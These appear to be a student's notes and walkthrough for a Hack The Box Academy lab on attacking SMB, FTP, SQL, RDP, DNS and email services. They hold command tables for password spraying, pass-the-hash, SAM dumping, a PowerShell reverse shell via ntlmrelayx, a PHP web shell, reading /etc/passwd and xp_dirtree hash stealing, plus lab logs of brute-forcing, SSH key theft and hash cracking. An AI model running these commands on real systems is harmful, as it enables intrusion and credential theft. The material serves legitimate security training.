
![](https://i.imgur.com/odyOpaO.png)

# Attacking Common Services

This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.
## Server Message Block (SMB)

SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.

## Windows

To open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
The command [net use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.
```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

| Syntax | Description                                                    |
| ------ | -------------------------------------------------------------- |
| `dir`  | Application                                                    |
| `n:`   | Directory or drive to search                                   |
| `/a-d` | `/a` is the attribute and `-d` means not directories           |
| `/s`   | Displays files in a specified directory and all subdirectories |
| `/b`   | Uses bare format (no heading information or summary)           |
The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With `dir` we can search for specific names in files such as:

- cred
- password
- users
- secrets
- key
- Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
```cmd-session
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).
```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called `cmdlets`. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets

#### Linux

Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

```shell-session
r3so1v3@htb[/htb]$ sudo mkdir /mnt/Finance
r3so1v3@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Alternatively we can use a credentials file
```shell-session
r3so1v3@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

#### Linux - Find
```shell-session
r3so1v3@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```

Next, let's find files that contain the string `cred`:
```shell-session
r3so1v3@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```

#### Tools to Interact with Common Services

  

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

### The Concept of Attacks
![](https://i.imgur.com/Xx3MCDa.png)

First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.

Sensitive information may include, but is not limited to:

- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.
## FTP - File Transfer Protocol
## SMB - Server Message Block

Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including smbclient, smbmap, rpcclient, or enum4linux. Let's explore how we can interact with file shares and RPC using null authentication.

### SQL - Structured Query Language

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system.
`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:


### RDP - Remote Desktop Protocol
Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. For this we use technique - password spraying, for this we can use: crowbar, hydra

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

## Commands
|**Command**|**Description**|
|---|---|
|`ftp 192.168.2.142`|Connecting to the FTP server using the `ftp` client.|
|`nc -v 192.168.2.142 21`|Connecting to the FTP server using `netcat`.|
|`hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142`|Brute-forcing the FTP service.|

## Attacking SMB

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //10.129.14.128`|Null-session testing against the SMB service.|
|`smbmap -H 10.129.14.128`|Network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 -r notes`|Recursive network share enumeration using `smbmap`.|
|`smbmap -H 10.129.14.128 --download "notes\note.txt"`|Download a specific file from the shared folder.|
|`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`|Upload a specific file to the shared folder.|
|`rpcclient -U'%' 10.10.110.17`|Null-session with the `rpcclient`.|
|`./enum4linux-ng.py 10.10.11.45 -A -C`|Automated enumeratition of the SMB service using `enum4linux-ng`.|
|`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`|Password spraying against different users from a list.|
|`impacket-psexec administrator:'Password123!'@10.10.110.17`|Connect to the SMB service using the `impacket-psexec`.|
|`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`|Execute a command over the SMB service using `crackmapexec`.|
|`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`|Enumerating Logged-on users.|
|`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`|Extract hashes from the SAM database.|
|`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`|Use the Pass-The-Hash technique to authenticate on the target host.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`|Dump the SAM database using `impacket-ntlmrelayx`.|
|`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>`|Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.|

## Attacking SQL Databases

|**Command**|**Description**|
|---|---|
|`mysql -u julio -pPassword123 -h 10.129.20.13`|Connecting to the MySQL server.|
|`sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`|Connecting to the MSSQL server.|
|`sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux.|
|`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`|Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.|
|`mysql> SHOW DATABASES;`|Show all available databases in MySQL.|
|`mysql> USE htbusers;`|Select a specific database in MySQL.|
|`mysql> SHOW TABLES;`|Show all available tables in the selected database in MySQL.|
|`mysql> SELECT * FROM users;`|Select all available entries from the "users" table in MySQL.|
|`sqlcmd> SELECT name FROM master.dbo.sysdatabases`|Show all available databases in MSSQL.|
|`sqlcmd> USE htbusers`|Select a specific database in MSSQL.|
|`sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`|Show all available tables in the selected database in MSSQL.|
|`sqlcmd> SELECT * FROM users`|Select all available entries from the "users" table in MSSQL.|
|`sqlcmd> EXECUTE sp_configure 'show advanced options', 1`|To allow advanced options to be changed.|
|`sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`|To enable the xp_cmdshell.|
|`sqlcmd> RECONFIGURE`|To be used after each sp_configure command to apply the changes.|
|`sqlcmd> xp_cmdshell 'whoami'`|Execute a system command from MSSQL server.|
|`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`|Create a file using MySQL.|
|`mysql> show variables like "secure_file_priv";`|Check if the the secure file privileges are empty to read locally stored files on the system.|
|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|
|`mysql> select LOAD_FILE("/etc/passwd");`|Read local files in MySQL.|
|`sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|
|`sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|
|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|
|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|

## Attacking RDP

|**Command**|**Description**|
|---|---|
|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|
|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|
|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|
|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|
|`net start sessionhijack`|Execute the RDP session hijack.|
|`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable "Restricted Admin Mode" on the target Windows host.|
|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|

## Attacking DNS

|**Command**|**Description**|
|---|---|
|`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`|Perform an AXFR zone transfer attempt against a specific name server.|
|`subfinder -d inlanefreight.com -v`|Brute-forcing subdomains.|
|`host support.inlanefreight.com`|DNS lookup for the specified subdomain.|

## Attacking Email Services

|**Command**|**Description**|
|---|---|
|`host -t MX microsoft.com`|DNS lookup for mail servers for the specified domain.|
|`dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`|DNS lookup for mail servers for the specified domain.|
|`host -t A mail1.inlanefreight.htb.`|DNS lookup of the IPv4 address for the specified subdomain.|
|`telnet 10.10.110.20 25`|Connect to the SMTP server.|
|`smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`|SMTP user enumeration using the RCPT command against the specified host.|
|`python3 o365spray.py --validate --domain msplaintext.xyz`|Verify the usage of Office365 for the specified domain.|
|`python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`|Enumerate existing users using Office365 on the specified domain.|
|`python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`|Password spraying against a list of users that use Office365 for the specified domain.|
|`hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`|Brute-forcing the POP3 service.|
|`swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213`|Testing the SMTP service for the open-relay vulnerability.|

# Questions & Answers

### Attacking FTP
1.  What port is the FTP service running on?

Do nmap scan and see that it is 2121

2.  What username is available for the FTP server?

First things first we need to try logging in as anonymous:
```
ftp -P 2121 anonymous@10.129.203.6
Connected to 10.129.203.6.
ls
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22514|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list

```

Then download both lists using get users.list and get passwords.list
Then open the users.list and try putting all the usernames to the htb-academy answer box until it gives correct

3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 

Then we can try bruteforcing with hydra for password, not medusa, cuz it takes longer:
```
hydra -l robin -P /home/r3so1ve/hack/htb-academy/attacking-common-services/passwords.list ftp://10.129.203.6:2121 -t 10

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-25 22:24:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 250 login tries (l:1/p:250), ~25 tries per task
[DATA] attacking ftp://10.129.203.6:2121/
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 150 to do in 00:02h, 10 active
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found

```
As we now the creds now:
```
username: robin
password: 7iz4rnckjsduza7
```
We ssh to target and get the flag:
```
ssh robin@10.129.203.6
```

### Attacking SMB
4. What is the name of the shared folder with READ permissions? 

So we need to use smbmap for this, as this tool will give us info about permissions, not smbclient
```
smbmap -H 10.129.203.6
[+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
```

5. What is the password for the username "jason"? 

So first of all we need to find the username jason, for this we use:
```
enum4linux-ng 10.129.203.6 -A

=====================================
|    Users via RPC on 10.129.203.6    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 user(s) via 'enumdomusers'
[+] After merging user results we have 2 user(s) total:
'1000':
  username: jason
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: robin
  name: ''
  acb: '0x00000010'
  description: ''

```
The output of the above command is much longer, but I included only the piece with username
Then we can use crackmapexec to bruteforce password for jason:
```
crackmapexec smb 10.129.203.6 -u 'jason' -p pws.list --local-auth
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
.
.
.
SNIP
.
.
.
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
```

6. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. 

As we now the username and password, so we can try to ssh as jason to target, but when we try it, we get:
```
ssh jason@10.129.203.6             
jason@10.129.203.6: Permission denied (publickey).
```
This means that we need to get `id_rsa` which located in the GGJ share, but at first we need to mount to share. Mounting a shared folder from a remote server (like an SMB share) allows you to access its contents as if they were part of your local filesystem. In this case, the reason to mount the SMB share is to access the `id_rsa` file (which is the SSH private key for the user) from the `GGJ` share on the remote server.

First create the folder for mounting:
```
sudo mkdir -p /mnt/smb_htb
```

So we mount and then copy it (`id_rsa`)to your comfy location:
```
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb_htb -o username=jason,password='34c8zuNBo91!@28Bszh',ro 
cp /mnt/smb_htb/id_rsa /home/r3so1ve/hack/htb-academy/attacking-common-services/
```

Making sure we got it:
```
ls
total 24K
-rwxr-xr-x 1 r3so1ve r3so1ve 3.4K Sep 26 11:59 id_rsa
-rw-r--r-- 1 r3so1ve r3so1ve 2.0K Sep 25 22:17 passwords.list
-rw-rw-r-- 1 r3so1ve r3so1ve 2.5K May  9  2022 pws.list
-rw-r--r-- 1 r3so1ve r3so1ve 1.6K Aug 23 15:09 pws.zip
-rw-rw-r-- 1 r3so1ve r3so1ve   72 Sep 25 22:17 users.list
-rw-r--r-- 1 r3so1ve r3so1ve  434 Aug 23 15:09 users.zip

```

Don't forget to change permissions:
```
chmod 600 id_rsa 
```

And finally ssh to target:
```
ssh jason@10.129.203.6 -i id_rsa 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Sep 2024 06:59:23 AM UTC

  System load:  0.04               Processes:               232
  Usage of /:   25.4% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens160: 10.129.203.6
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}

```


### Attacking SQL Databases

Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"
7. What is the password for the "mssqlsvc" user?

First of all I ran nmap script:
```
nmap -Pn -sV -sC -p- 10.10.10.125 --min-rate 3000 -n
```
Then I discovered that port 1433 was opened. And as we have creds to authenticate to DB I decided to use sqsh tool for that at first
I decided to install it, but had problems with no properly installed FreeTDS or Sybase environment found in /usr. So later I decided to use sqlcmd tool instead sqsh
I also needed to install it first:
```
sudo apt update 
sudo apt install curl apt-transport-https
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
echo "deb [arch=amd64] https://packages.microsoft.com/repos/ubuntu/ focal main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
sudo apt update
sudo apt install mssql-tools
export PATH="$PATH:/opt/mssql-tools/bin"
source ~/.bashrc  # или source ~/.zshrc, если вы используете Zsh
sqlcmd -?
```
Insert the above commands one by one to install sqlcmd
Then as we successfully installed it, we can now connect to DB:
```
sqlcmd -S 10.129.68.230 -U htbdbuser
Password: 
1> show databases;
2> go
Msg 2812, Level 16, State 62, Server WIN-02\SQLEXPRESS, Line 1
Could not find stored procedure 'show'.
1> SELECT name FROM master.dbo.sysdatabases
2> go
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
hmaildb                                                                                                                         
flagDB                           
```

As we need to get the password of the user mssqlcvs we can do this by XP_SUBDIRS Hash Stealing with impacket
On attacking machine:
```
sudo impacket-smbserver share ./ -smb2support 
[sudo] password for r3so1v3: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Then we run:
```
1> EXEC master..xp_dirtree '\\10.10.16.43\share\'
2> GO
subdirectory                                                                                                                                                                                                                                                         depth      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------

(0 rows affected)
```
This way we use XP_DIRTREE for Hash Stealing
After that we need to return to our attack machine and we can see that we got hash:
```
sudo impacket-smbserver share ./ -smb2support 
[sudo] password for r3so1v3: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.68.230,49676)
[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
[*] User WIN-02\mssqlsvc authenticated successfully
[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:1cd215cecbce3abaeadb0fc4181255b2:010100000000000000322dad1411db015da772170901c63a0000000001001000410057007100730065004f0053006e0003001000410057007100730065004f0053006e0002001000610045006f0069004e0062004f00760004001000610045006f0069004e0062004f0076000700080000322dad1411db01060004000200000008003000300000000000000000000000003000002e730fc16d3cd75cf010a577516f7fe7231017147e654f5b6fd60366c83c8ccc0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340033000000000000000000
[*] Closing down connection (10.129.68.230,49676)
[*] Remaining connections []

```
Now we need to crack it using john the ripper. But firstly copy and paste the above hash into the file, for example "hash". Then start cracking it:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (mssqlsvc)     
1g 0:00:00:00 DONE (2024-09-28 00:39) 25.00g/s 51200p/s 51200c/s 51200C/s 123456..lovers1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
So we see that we got the password: princess1

9. Enumerate the "flagDB" database and submit a flag as your answer.

First we need to connect to MySQL via sqlcmd:
```
sqlcmd -S 10.129.26.147 -U htbdbuser
```

Enter the password provided by the task and we are in
Next we use impacket tools to log in to mssql database using the user mssqlcvs and password princess1. It would typically be used in a penetration testing scenario to try to authenticate and interact with the SQL Server.
```
impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 mssqlsvc@10.129.26.147 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (WIN-02\mssqlsvc  guest@master)> 
```

We can use the following command to list the available dbs:
```
SQL (WIN-02\mssqlsvc  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   

tempdb                    0   

model                     0   

msdb                      1   

hmaildb                   0   

flagDB                    0   
```

Also we can see the users, owners and logins:
```
SQL (WIN-02\mssqlsvc  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   

guest                public     NULL        NULL        guest           b'2         '   b'00'   

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   

sys                  public     NULL        NULL        NULL            b'4         '    NULL   

SQL (WIN-02\mssqlsvc  guest@master)> enum_owner
Database   Owner                    
--------   ----------------------   
master     sa                       

tempdb     sa                       

model      sa                       

msdb       sa                       

hmaildb    hmaildblogin             

flagDB     WINSRV02\Administrator   

SQL (WIN-02\mssqlsvc  guest@master)> enum_logins
name                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                  SQL_LOGIN                 1          1               0             0            0              0           0           0           0   

BUILTIN\Users       WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

WINSRV02\mssqlsvc   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

```

Then we need to verify our current user and role:
```
sqlcmd -S 10.129.26.147 -U htbdbuser
Password: 
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
                                                                                                                                
--------------------------------------------------------------------------------------------------------------------------------
htbdbuser                                                                                                                       

(1 rows affected)
           
-----------
          0

(1 rows affected)

```

Now we need to attempt to log into a Microsoft SQL Server running on the IP address `10.129.26.147` over port `1433` using the `mssqlsvc` account in the `WIN-02` domain via Windows authentication:
```
impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 WIN-02/mssqlsvc@10.129.26.147 -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (WIN-02\mssqlsvc  guest@master)> 
```

Next I decided to change to flagDB database:
```
SQL (WIN-02\mssqlsvc  guest@master)> use flagDB
ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> enum_users
UserName             RoleName        LoginName           DefDBName   DefSchemaName       UserID                                                           SID   
------------------   -------------   -----------------   ---------   -------------   ----------   -----------------------------------------------------------   
dbo                  db_owner        NULL                NULL        dbo             b'1         '   b'010500000000000515000000970c23f7a4be5d373abe7dbaf4010000'   

guest                public          NULL                NULL        guest           b'2         '                                                         b'00'   

INFORMATION_SCHEMA   public          NULL                NULL        NULL            b'3         '                                                          NULL   

sys                  public          NULL                NULL        NULL            b'4         '                                                          NULL   

WINSRV02\mssqlsvc    db_datareader   WINSRV02\mssqlsvc   master      dbo             b'5         '   b'010500000000000515000000970c23f7a4be5d373abe7dbaed030000' 
```

Later on I used xp_dirtree to list the directories available on the SQL Server's file system and used`select table_name from information_schema.tables`  to list all the tables in the `flagDB` and finally fetched the content of the flag:
```
SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Config.Msi                      1      0   

Documents and Settings          1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

SQL2019                         1      0   

System Volume Information       1      0   

Temp                            1      0   

Users                           1      0   

